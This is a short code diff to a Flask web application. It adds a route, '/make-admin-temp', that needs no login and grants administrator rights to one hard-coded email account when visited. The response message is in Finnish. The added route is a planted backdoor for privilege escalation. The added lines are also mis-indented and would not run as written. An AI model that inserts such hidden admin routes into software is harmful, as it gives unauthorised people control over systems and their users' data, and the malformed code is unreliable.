@@ -61,7 +61,11 @@ def create_app():
     @app.route("/logged-out")
     def logged_out():
         return render_template_string(LOGOUT_PAGE)
-
+    @app.route("/make-admin-temp")
+        def make_admin_temp():
+    make_user_admin("ville_salovaara@hotmail.com")
+    return "Admin-oikeus annettu"
+    
     return app
 
 def cli_test():
